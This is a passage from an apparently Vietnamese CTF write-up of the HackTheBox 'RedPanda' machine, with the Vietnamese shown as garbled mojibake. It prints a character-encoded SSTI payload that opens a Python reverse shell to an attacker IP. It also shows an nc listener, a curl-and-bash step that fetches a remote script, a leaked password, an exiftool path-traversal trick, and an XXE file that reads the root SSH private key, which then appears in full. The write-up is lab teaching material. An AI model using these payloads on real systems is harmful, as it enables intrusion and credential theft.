Character).toString(101)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(59)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(61)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(70)).concat(T(java.lang.Character).toString(95)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(75)).concat(T(java.lang.Character).toString(95)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(59)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(34)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(34)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(59)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(59)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(59)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(59)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(59)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(34)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(34)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(39))).getInputStream())} â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ Táº¡o listener trÃªn mÃ¡y remote: nc - lnvp 2402\nBÃ¢y giá» thÃ¬ sao chÃ©p Ä‘oáº¡n code dÃ i ngoáº±ng phÃ­a trÃªn vÃ o pháº§n command. NhÆ°ng sau 1 thá»i gian loay hoay mÃ£i tÃ´i cÅ©ng khÃ´ng thá»ƒ nÃ o gá»i Ä‘Æ°á»£c shell, ká»ƒ cáº£ Ä‘Ã£ upload thÃ nh cÃ´ng 1 file shell php lÃªn server nhÆ° tháº¿ nÃ y\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ python -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.11.170 - - [31/Oct/2022 04:53:21] \u0026#34;GET /shell.php HTTP/1.1\u0026#34; 200 - TÃ´i cÅ©ng khÃ´ng thá»ƒ nÃ o gá»i Ä‘Æ°á»£c shell vá», Ä‘Ã nh pháº£i ngá»“i gÃµ lá»‡nh thá»§ cÃ´ng rá»“i chuyá»ƒn nÃ³ thÃ nh java Ä‘á»ƒ tÃ¬m hiá»ƒu bÃªn trong nÃ y khÃ´ng.\nUser flag # Vá»›i cÃ¡ch trÃªn thÃ¬ tÃ´i cÅ©ng Ä‘Ã£ cÃ³ thá»ƒ láº¥y user flag thÃ nh cÃ´ng vÃ¬ hiá»‡n táº¡i tÃ´i Ä‘ang á»Ÿ truy cáº­p vá»›i user woodenk vÃ  user flag náº±m trong thÆ° má»¥c user nÃ y.\nChuyá»ƒn Ä‘á»•i cÃ¢u lá»‡nh cat /home/woodenk/user.txt thÃ nh code java vÃ  thá»­ láº¡i, tÃ´i sáº½ cÃ³ user flag.\nSau 1 lÃºc cosplay chÃº bÃ© Ä‘áº§n thÃ¬ tÃ´i má»›i nháº­n ra lÃ  tÃ´i Ä‘ang khÃ´ng á»Ÿ thÆ° má»¥c mÃ  tÃ´i cÃ³ thá»ƒ thá»±c thi Ä‘Æ°á»£c shell vÃ¬ khÃ´ng cÃ³ quyá»n. VÃ  Ä‘á»ƒ cho cháº¯c cháº¯n thÃ¬ tÃ´i sáº½ nhÃ©t láº¡i shell vÃ o /tmp/ vÃ  cháº¡y nÃ³ vá»›i bash. Chuyá»ƒn command bÃªn dÆ°á»›i thÃ nh code java:\ncurl 10.10.14.4:8000/exploit.sh --output /tmp/exploit.sh\nCuá»‘i cÃ¹ng lÃ  bash /tmp/exploit.sh\nNote: táº¥t cáº£ command Ä‘á»u chuyá»ƒn thÃ nh code java\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ nc -lnvp 2402 listening on [any] 2402 ... connect to [10.10.14.12] from (UNKNOWN) [10.10.11.170] 39958 bash: cannot set terminal process group (877): Inappropriate ioctl for device bash: no job control in this shell woodenk@redpanda:/tmp/hsperfdata_woodenk$ id id uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk) woodenk@redpanda:/tmp/hsperfdata_woodenk$ SSH # Sau khi thá»­ qua cÃ¡c phÆ°Æ¡ng phÃ¡p Ä‘Æ¡n giáº£n nhÆ° sudo -l hay find Ä‘á»u khÃ´ng cÃ³ káº¿t quáº£, tÃ´i sáº½ thá»­ táº£i lÃªn linpeas.sh Ä‘á»ƒ phÃ¢n tÃ­ch machine nÃ y\nSau khi phÃ¢n tÃ­ch qua káº¿t quáº£, tÃ´i Ä‘á»ƒ Ã½ tháº¥y user root thá»±c thi file jar trong thÆ° má»¥c /opt\nwoodenk@redpanda:/opt$ ll ll total 24 drwxr-xr-x 5 root root 4096 Jun 23 18:12 ./ drwxr-xr-x 20 root root 4096 Jun 23 14:52 ../ -rwxr-xr-x 1 root root 462 Jun 23 18:12 cleanup.sh* drwxr-xr-x 3 root root 4096 Jun 14 14:35 credit-score/ drwxr-xr-x 6 root root 4096 Jun 14 14:35 maven/ drwxrwxr-x 5 root root 4096 Jun 14 14:35 panda_search/ woodenk@redpanda:/opt$ Sau 1 lÃºc kiá»ƒm tra qua táº¥t cáº£ cÃ¡c thÆ° má»¥c nÃ y, tÃ´i tÃ¬m tháº¥y 1 thá»© mÃ¬nh cáº§n\nwoodenk@redpanda:/opt$ ls -la panda_search/target/classes/com/panda_search/htb/panda_search total 28 drwxrwxr-x 2 root root 4096 Jun 20 13:51 . drwxrwxr-x 3 root root 4096 Jun 14 14:35 .. -rw-rw-r-- 1 root root 6460 Jun 20 13:51 MainController.java -rw-rw-r-- 1 root root 1416 Jun 20 13:51 PandaSearchApplication.java -rw-r--r-- 1 root root 2957 Jun 20 13:51 RequestInterceptor.java -rw-rw-r-- 1 root root 2128 Feb 21 2022 SqlController.java woodenk@redpanda:/opt$ MainController.java\n\u0026lt;h/src/main/java/com/panda_search/htb/panda_search$ cat MainController.java cat MainController.java package com.panda_search.htb.panda_search; import java.util.ArrayList; import java.io.IOException; import java.sql.*; import java.util.List; import java.util.ArrayList; import java.io.File; import java.io.InputStream; import java.io.FileInputStream; import org.springframework.stereotype.Controller; import org.springframework.ui.Model; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.bind.annotation.RestController; import org.springframework.web.bind.annotation.ResponseBody; import org.springframework.web.servlet.ModelAndView; import org.springframework.http.MediaType; import org.apache.commons.io.IOUtils; import org.jdom2.JDOMException; import org.jdom2.input.SAXBuilder; import org.jdom2.output.Format; import org.jdom2.output.XMLOutputter; import org.jdom2.*; @Controller public class MainController { @GetMapping(\u0026#34;/stats\u0026#34;) public ModelAndView stats(@RequestParam(name=\u0026#34;author\u0026#34;,required=false) String author, Model model) throws JDOMException, IOException{ SAXBuilder saxBuilder = new SAXBuilder(); if(author == null) author = \u0026#34;N/A\u0026#34;; author = author.strip(); System.out.println(\u0026#39;\u0026#34;\u0026#39; + author + \u0026#39;\u0026#34;\u0026#39;); if(author.equals(\u0026#34;woodenk\u0026#34;) || author.equals(\u0026#34;damian\u0026#34;)) { String path = \u0026#34;/credits/\u0026#34; + author + \u0026#34;_creds.xml\u0026#34;; File fd = new File(path); Document doc = saxBuilder.build(fd); Element rootElement = doc.getRootElement(); String totalviews = rootElement.getChildText(\u0026#34;totalviews\u0026#34;); List\u0026lt;Element\u0026gt; images = rootElement.getChildren(\u0026#34;image\u0026#34;); for(Element image: images) System.out.println(image.getChildText(\u0026#34;uri\u0026#34;)); model.addAttribute(\u0026#34;noAuthor\u0026#34;, false); model.addAttribute(\u0026#34;author\u0026#34;, author); model.addAttribute(\u0026#34;totalviews\u0026#34;, totalviews); model.addAttribute(\u0026#34;images\u0026#34;, images); return new ModelAndView(\u0026#34;stats.html\u0026#34;); } else { model.addAttribute(\u0026#34;noAuthor\u0026#34;, true); return new ModelAndView(\u0026#34;stats.html\u0026#34;); } } @GetMapping(value=\u0026#34;/export.xml\u0026#34;, produces = MediaType.APPLICATION_OCTET_STREAM_VALUE) public @ResponseBody byte[] exportXML(@RequestParam(name=\u0026#34;author\u0026#34;, defaultValue=\u0026#34;err\u0026#34;) String author) throws IOException { System.out.println(\u0026#34;Exporting xml of: \u0026#34; + author); if(author.equals(\u0026#34;woodenk\u0026#34;) || author.equals(\u0026#34;damian\u0026#34;)) { InputStream in = new FileInputStream(\u0026#34;/credits/\u0026#34; + author + \u0026#34;_creds.xml\u0026#34;); System.out.println(in); return IOUtils.toByteArray(in); } else { return IOUtils.toByteArray(\u0026#34;Error, incorrect paramenter \u0026#39;author\u0026#39;\\n\\r\u0026#34;); } } @PostMapping(\u0026#34;/search\u0026#34;) public ModelAndView search(@RequestParam(\u0026#34;name\u0026#34;) String name, Model model) { if(name.isEmpty()) { name = \u0026#34;Greg\u0026#34;; } String query = filter(name); ArrayList pandas = searchPanda(query); System.out.println(\u0026#34;\\n\\\u0026#34;\u0026#34;+query+\u0026#34;\\\u0026#34;\\n\u0026#34;); model.addAttribute(\u0026#34;query\u0026#34;, query); model.addAttribute(\u0026#34;pandas\u0026#34;, pandas); model.addAttribute(\u0026#34;n\u0026#34;, pandas.size()); return new ModelAndView(\u0026#34;search.html\u0026#34;); } public String filter(String arg) { String[] no_no_words = {\u0026#34;%\u0026#34;, \u0026#34;_\u0026#34;,\u0026#34;$\u0026#34;, \u0026#34;~\u0026#34;, }; for (String word : no_no_words) { if(arg.contains(word)){ return \u0026#34;Error occured: banned characters\u0026#34;; } } return arg; } public ArrayList searchPanda(String query) { Connection conn = null; PreparedStatement stmt = null; ArrayList\u0026lt;ArrayList\u0026gt; pandas = new ArrayList(); try { Class.forName(\u0026#34;com.mysql.cj.jdbc.Driver\u0026#34;); conn = DriverManager.getConnection(\u0026#34;jdbc:mysql://localhost:3306/red_panda\u0026#34;, \u0026#34;woodenk\u0026#34;, \u0026#34;RedPandazRule\u0026#34;); stmt = conn.prepareStatement(\u0026#34;SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?\u0026#34;); stmt.setString(1, \u0026#34;%\u0026#34; + query + \u0026#34;%\u0026#34;); ResultSet rs = stmt.executeQuery(); while(rs.next()){ ArrayList\u0026lt;String\u0026gt; panda = new ArrayList\u0026lt;String\u0026gt;(); panda.add(rs.getString(\u0026#34;name\u0026#34;)); panda.add(rs.getString(\u0026#34;bio\u0026#34;)); panda.add(rs.getString(\u0026#34;imgloc\u0026#34;)); panda.add(rs.getString(\u0026#34;author\u0026#34;)); pandas.add(panda); } }catch(Exception e){ System.out.println(e);} return pandas; } } \u0026lt;h/src/main/java/com/panda_search/htb/panda_search$ Váº­y lÃ  tÃ´i cÃ³ user woodenk vÃ  pass RedPandazRule Ä‘á»ƒ login vÃ o database red_panda, nhÆ°ng trÆ°á»›c Ä‘Ã³ tÃ´i sáº½ thá»­ dÃ¹ng pass nÃ y Ä‘á»ƒ login ssh\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ssh woodenk@10.10.11.170 woodenk@10.10.11.170\u0026#39;s password: Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed 02 Nov 2022 07:51:51 AM UTC System load: 0.06 Usage of /: 79.0% of 4.30GB Memory usage: 45% Swap usage: 0% Processes: 228 Users logged in: 0 IPv4 address for eth0: 10.10.11.170 IPv6 address for eth0: dead:beef::250:56ff:feb9:59a0 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Tue Jul 5 05:51:25 2022 from 10.10.14.23 woodenk@redpanda:~$ Privilege escalation # Trong lÃºc truy cáº­p machine thÃ´ng qua RCE tÃ´i Ä‘Ã£ Ä‘á»ƒ Ã½ cÃ³ 1 file tÃªn pspy64, nÃ³ lÃ m tÃ´i nghÄ© Ä‘áº¿n pspy. ÄÃ¢y lÃ  cÃ´ng cá»¥ cÃ³ thá»ƒ theo dÃµi Ä‘Æ°á»£c cÃ¡c tiáº¿n trÃ¬nh cháº¡y trÃªn mÃ¡y mÃ  khÃ´ng cáº§n quyá»n root\nKhi cháº¡y thá»­ nÃ³ thÃ¬ tÃ´i nháº­n tháº¥y cÃ³ vÃ i tiáº¿n trÃ¬nh hÆ¡i khÃ³ hiá»ƒu\n2022/11/02 08:30:01 CMD: UID=1000 PID=2156 | /bin/bash /opt/cleanup.sh 2022/11/02 08:30:01 CMD: UID=1000 PID=2157 | /usr/bin/find /tmp -name *.xml -exec rm -rf {} ; 2022/11/02 08:30:01 CMD: UID=1000 PID=2163 | /usr/bin/find /var/tmp -name *.xml -exec rm -rf {} ; 2022/11/02 08:30:01 CMD: UID=1000 PID=2164 | /usr/bin/find /dev/shm -name *.xml -exec rm -rf {} ; 2022/11/02 08:30:01 CMD: UID=1000 PID=2166 | /usr/bin/find /home/woodenk -name *.xml -exec rm -rf {} ; 2022/11/02 08:30:01 CMD: UID=1000 PID=2165 | /usr/bin/find /home/woodenk -name *.xml -exec rm -rf {} ; 2022/11/02 08:30:01 CMD: UID=1000 PID=2177 | /bin/bash /opt/cleanup.sh 2022/11/02 08:30:01 CMD: UID=1000 PID=2179 | /bin/bash /opt/cleanup.sh 2022/11/02 08:30:01 CMD: UID=1000 PID=2181 | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ; 2022/11/02 08:30:19 CMD: UID=??? PID=2185 | ??? 2022/11/02 08:32:00 CMD: UID=??? PID=2187 | ??? Táº¡i sao pháº£i xÃ³a cÃ¡c tá»‡p Ä‘uÃ´i xml hay jpg?\nThá»±c sá»± thÃ¬ Ä‘áº¿n Ä‘Ã¢y tÃ´i pháº£i xem 1 chÃºt giáº£i thÃ­ch cá»§a nhá»¯ng ngÆ°á»i Ä‘Ã£ lÃ m trÆ°á»›c Ä‘Ã³ vÃ¬ thá»±c sá»± tÃ´i khÃ´ng tÃ¬m Ä‘Æ°á»£c hÆ°á»›ng Ä‘i tiáº¿p theo.\nTheo nhá»¯ng gÃ¬ Ä‘á»c Ä‘Æ°á»£c vÃ  hiá»ƒu Ä‘Æ°á»£c thÃ¬ tÃ´i sáº½ tiáº¿p tá»¥c phÃ¢n tÃ­ch file java phÃ­a trÃªn. á» Ä‘Ã³ cÃ³ 1 Ä‘oáº¡n code Ä‘á»ƒ xuáº¥t ra file xml vá»›i format \u0026quot;/credits/\u0026quot; + author + \u0026quot;_creds.xml\u0026quot;\nTÃ´i thá»­ tÃ¬m táº¥t cáº£ cÃ¡c file java Ä‘á»ƒ kiá»ƒm tra vÃ  phÃ¢n tÃ­ch xem cÃ³ gÃ¬ Ä‘áº·c biá»‡t khÃ´ng.\nwoodenk@redpanda:~$ find / -type f -name *.java 2\u0026gt;/dev/null /opt/panda_search/.mvn/wrapper/MavenWrapperDownloader.java /opt/panda_search/src/test/java/com/panda_search/htb/panda_search/PandaSearchApplicationTests.java /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/RequestInterceptor.java /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/PandaSearchApplication.java /opt/credit-score/LogParser/final/.mvn/wrapper/MavenWrapperDownloader.java /opt/credit-score/LogParser/final/src/test/java/com/logparser/AppTest.java /opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java woodenk@redpanda:~$ App.java:\n... public static String getArtist(String uri) throws IOException, JpegProcessingException { String fullpath = \u0026#34;/opt/panda_search/src/main/resources/static\u0026#34; + uri; File jpgFile = new File(fullpath); Metadata metadata = JpegMetadataReader.readMetadata(jpgFile); for(Directory dir : metadata.getDirectories()) { for(Tag tag : dir.getTags()) { if(tag.getTagName() == \u0026#34;Artist\u0026#34;) { return tag.getDescription(); } } } ... Trong file nÃ y tÃ´i nháº­n ra Ä‘oáº¡n code nÃ y Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ phÃ¢n tÃ­ch file áº£nh báº±ng phÆ°Æ¡ng thá»©c metadata vÃ  Ä‘á»c trÆ°á»ng \u0026ldquo;Artist\u0026rdquo; Ä‘á»ƒ in ra xml path \u0026quot;/credits/\u0026quot; + artist + \u0026quot;_creds.xml\u0026quot;, váº­y nÃªn tÃ´i sáº½ thay Ä‘á»•i trÆ°á»ng \u0026ldquo;Artist\u0026rdquo; trong file áº£nh báº¥t ká»³ thÃ nh Ä‘á»‹a chá»‰ nÆ¡i mÃ  tÃ´i sáº½ Ä‘áº·t file xml.\nVÃ  Ä‘á»ƒ khÃ´ng láº·p láº¡i sai láº§m nhÆ° phÃ­a trÃªn lÃ  thá»±c thi trÃªn thÆ° má»¥c khÃ´ng cÃ³ quyá»n Write thÃ¬ tÃ´i sáº½ trá» xml vÃ o thÆ° má»¥c cá»§a user woodenk\nÄáº§u tiÃªn táº£i 1 chiáº¿c áº£nh vá» vÃ  thay Ä‘á»•i trÆ°á»ng \u0026ldquo;Artist\u0026rdquo; cá»§a nÃ³\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ exiftool -Artist=\u0026#34;../home/woodenk/privesc\u0026#34; user.jpg 1 image files updated â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ scp user.jpg woodenk@10.10.11.170:. woodenk@10.10.11.170\u0026#39;s password: user.jpg 100% 13KB 185.9KB/s 00:00 Sau Ä‘Ã³ tÃ´i táº¡o 1 file xml sá»­ dá»¥ng XML Entity Expansion in Java Ä‘á»ƒ Ä‘á»c ssh private key cá»§a user root. VÃ  nhÆ° á»Ÿ trÃªn tÃ´i Ä‘á»ƒ Ä‘Æ°á»ng dáº«n Ä‘áº¿n privesc thÃ¬ vá»›i quy Æ°á»›c Ä‘áº·t tÃªn \u0026quot;/credits/\u0026quot; + artist + \u0026quot;_creds.xml\u0026quot; tÃ´i sáº½ pháº£i Ä‘áº·t tÃªn file xml nÃ y lÃ  privesc_creds.xml\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE replace [\u0026lt;!ENTITY key SYSTEM \u0026#34;file:///root/.ssh/id_rsa\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;credits\u0026gt; \u0026lt;author\u0026gt;damian\u0026lt;/author\u0026gt; \u0026lt;image\u0026gt; \u0026lt;uri\u0026gt;/../../../../../../../home/woodenk/user.jpg\u0026lt;/uri\u0026gt; \u0026lt;views\u0026gt;1\u0026lt;/views\u0026gt; \u0026lt;foo\u0026gt;\u0026amp;xxe;\u0026lt;/foo\u0026gt; \u0026lt;/image\u0026gt; \u0026lt;totalviews\u0026gt;2\u0026lt;/totalviews\u0026gt; \u0026lt;/credits\u0026gt; CÅ©ng vá»›i file App.java, tÃ´i nháº­n tháº¥y cÃ¡ch User-Agent Ä‘Æ°á»£c xá»­ lÃ½:\npublic static Map parseLog(String line) { String[] strings = line.split(\u0026#34;\\\\|\\\\|\u0026#34;); Map map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;status_code\u0026#34;, Integer.parseInt(strings[0])); map.put(\u0026#34;ip\u0026#34;, strings[1]); map.put(\u0026#34;user_agent\u0026#34;, strings[2]); map.put(\u0026#34;uri\u0026#34;, strings[3]); return map; } TÃ´i sáº½ sá»­ dá»¥ng 1 lá»‡nh curl Ä‘á»ƒ gá»­i 1 request lÃªn server vá»›i User-Agent Ä‘Ã£ Ä‘Æ°á»£c sá»­a Ä‘á»•i thÃ nh Ä‘Æ°á»ng dáº«n Ä‘áº¿n áº£nh tÃ´i Ä‘Ã£ lÃªn phÃ­a trÃªn. VÃ  khi nÃ³ thá»±c thi, nÃ³ sáº½ tráº£ vá» cho tÃ´i private key cá»§a user root\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ curl http://10.10.11.170:8080 -H \u0026#34;User-Agent: ||/../../../../../../../home/woodenk/user.jpg\u0026#34; Chá» 1 chÃºt Ä‘á»ƒ server xá»­ lÃ½ vÃ  má»Ÿ láº¡i file xml vá»«a táº¡o.\nwoodenk@redpanda:~$ cat privesc_creds.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE replace\u0026gt; \u0026lt;credits\u0026gt; \u0026lt;author\u0026gt;damian\u0026lt;/author\u0026gt; \u0026lt;image\u0026gt; \u0026lt;uri\u0026gt;/../../../../../../../home/woodenk/user.jpg\u0026lt;/uri\u0026gt; \u0026lt;views\u0026gt;3\u0026lt;/views\u0026gt; \u0026lt;foo\u0026gt;-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29 ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE= -----END OPENSSH PRIVATE KEY-----\u0026lt;/foo\u0026gt; \u0026lt;/image\u0026gt; \u0026lt;totalviews\u0026gt;4\u0026lt;/totalviews\u0026gt; \u0026lt;/credits\u0026gt; woodenk@redpanda:~$ LÆ°u private key nÃ y vá» vÃ  login ssh\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ssh -i id_rsa root@10.10.11.170 Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu 03 Nov 2022 03:19:59 AM UTC System load: 0.0 Usage of /: 82.9% of 4.30GB Memory usage: 59% Swap usage: 0% Processes: 226 Users logged in: 1 IPv4 address for eth0: 10.10.11.170 IPv6 address for eth0: dead:beef::250:56ff:feb9:c2da 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Wed Nov 2 13:54:23 2022 from 10.10.14.15 root@redpanda:~# id uid=0(root) gid=0(root) groups=0(root) root@redpanda:~# ls root.txt root@redpanda:~# ÄÃ¢y lÃ  1 bÃ i tuy lÃ  má»©c easy nhÆ°ng cÅ©ng cáº§n khÃ¡ nhiá»u ká»¹ nÄƒng, Ä‘áº·c biá»‡t lÃ  hiá»ƒu vÃ  viáº¿t payload cÅ©ng nhÆ° phÃ¢n tÃ­ch code java. TÃ´i tham kháº£o writeup á»Ÿ Ä‘Ã¢y. NÃ³ giáº£i thÃ­ch khÃ¡ chi tiáº¿t vÃ  khÃ¡ dá»… hiá»ƒu.\n","date":"24 October 2022","externalUrl":null,"permalink":"/ctf/hackthebox/redpanda/","section":"Ctf","summary":"","title":"HackTheBox - RedPanda","type":"ctf"},{"content":"","date":"24 October 2022","externalUrl":null,"permalink":"/tags/java/","section":"Tags","summary":"","title":"Java","type":"tags"},{"content":"","date":"24 October 2022","externalUrl":null,"permalink":"/tags/pspy/","section":"Tags","summary":"","title":"Pspy","type":"tags"},{"content":"","date":"24 October 2022","externalUrl":null,"permalink":"/tags/ssti/","section":"Tags","summary":"","title":"Ssti","type":"tags"},{"content":"","date":"24 October 2022","externalUrl":null,"permalink":"/tags/xxe/","section":"Tags","summary":"","title":"Xxe","type":"tags"},{"content":"TryHackMe - Watcher\nReconnaissance and Scanning # PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 63 vsftpd 3.0.3 